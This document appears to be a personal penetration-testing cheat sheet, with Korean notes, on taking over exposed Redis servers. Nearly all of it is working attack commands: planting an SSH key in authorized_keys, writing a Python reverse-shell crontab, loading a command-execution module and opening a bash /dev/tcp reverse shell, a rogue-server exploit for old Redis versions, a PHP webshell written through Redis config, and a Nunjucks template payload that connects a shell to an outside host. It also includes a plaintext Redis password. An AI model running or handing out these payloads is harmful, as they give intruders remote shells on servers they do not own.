---
sticker: emoji//1f7e5
---
### Files to read
```sh
cat /etc/redis/redis.conf
# 패스워드는 #requirepass 란에 위치
# ...
# requirepass Ready4Redis?

cat /etc/systemd/system/redis.service
# 어떤 경로에 파일이 써지는지 확인
# ReadWriteDirectories=/etc/redis-files
```

### SSH
```sh
# ssh keygen
ssh-keygen -t rsa
# Write keyfile
(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt
# import file to redis
cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key
# Save public key to the `authorized_keys`
redis-cli -h 10.85.0.52

10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK

```

### Crontab
```sh
echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
redis-cli -h 10.85.0.52 config set dbfilename root
OK
redis-cli -h 10.85.0.52 save
OK

```
### Load Redis Module
compile
```sh
// Complie the downloaded module from github  
$ cd RedisModules-ExecuteCommand-master  
  
$ ls  
LICENSE Makefile README.md redismodule.h rmutil src  
  
$ sudo make  
make -C ./src  
...  
module.c:27:25: note: include ‘<string.h>’ or provide a declaration of ‘strcat’  
module.c:27:25: warning: incompatible implicit declaration of built-in function ‘strcat’ [-Wbuiltin-declaration-mismatch]  
module.c:27:25: note: include ‘<string.h>’ or provide a declaration of ‘strcat’  
...  
cp ./src/module.so .
```

module을 ftp로 업로드하는 예시 (다른 경로로도 업로드 가능)
```sh
// upload the module using FTP  
$ ftp 192.168.222.93  
Connected to 192.168.222.93.  
220 (vsFTPd 3.0.2)  
Name (): anonymous  
331 Please specify the password.  
Password:  
230 Login successful.  
Remote system type is UNIX.  
Using binary mode to transfer files.  
ftp> ls  
229 Entering Extended Passive Mode (|||10091|).  
150 Here comes the directory listing.  
drwxrwxrwx 2 0 0 6 Apr 01 2020 pub  
226 Directory send OK.  
ftp> cd pub  
250 Directory successfully changed.  
ftp> ls  
229 Entering Extended Passive Mode (|||10100|).  
150 Here comes the directory listing.  
226 Directory send OK.  
ftp> put module.so  
local: module.so remote: module.so  
229 Entering Extended Passive Mode (|||10091|).  
150 Ok to send data.  
100% |**********************************************************************| 47896 1.32 MiB/s 00:00 ETA  
226 Transfer complete.  
47896 bytes sent in 00:00 (712.78 KiB/s)  
ftp> ls  
229 Entering Extended Passive Mode (|||10099|).  
150 Here comes the directory listing.  
-rw-rw-rw- 1 14 50 47896 Mar 24 19:40 module.so  
226 Directory send OK.
```

load module
```sh
// load the module using redis-cli  
$ redis-cli -h 192.168.222.93  
192.168.222.93:6379> MODULE LOAD /var/ftp/pub/module.so  
OK  
192.168.222.93:6379> system.exec "id"  
"uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)\n"  
192.168.222.93:6379> system.exec "/bin/bash -i >& /dev/tcp/192.168.45.168/6379 0>&1"  
  
// using the RCE to catch a reverse shell from the machine  
$ sudo nc -nlvp 6379  
listening on [any] 6379 ...  
connect to [192.168.45.168] from (UNKNOWN) [192.168.222.93] 52006  
bash: no job control in this shell  
[pablo@sybaris /]$ id  
id  
uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)
```
git: https://github.com/n0b0dyCN/RedisModules-ExecuteCommand

### Redis <= 5.0.5 
```sh
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```
url: https://github.com/n0b0dyCN/redis-rogue-server

### PHP Webshell
```sh
# Connect redis
redis-cli -h 192.168.63.166 -a "Ready4Redis?"

Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
192.168.63.166:6379> CONFIG GET *
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) "Ready4Redis?"
  5) "masterauth"
  6) ""
...
192.168.63.166:6379> config set dir /opt/redis-files
OK
192.168.63.166:6379> config set dbfilename exe.php
OK
192.168.63.166:6379> set test "<?= system($_GET['cmd']); ?>"
OK
192.168.63.166:6379> save
OK
192.168.63.166:6379> 
```
-> 이후는 직접 접근, LFI 등 취약점으로 웹 코드가 실행되게 만들면 됨.

### Template Webshell - nunjunks exploit
```sh
{{ ({}).constructor.constructor(
  "var net = global.process.mainModule.require('net'),
       cp = global.process.mainModule.require('child_process'),
       sh = cp.spawn('sh', []);
   var client = new net.Socket();
   client.connect(1234, 'my-server.com', function(){
      client.pipe(sh.stdin);
      sh.stdout.pipe(client);
      sh.stderr.pipe(client);
   });"
)()}}

```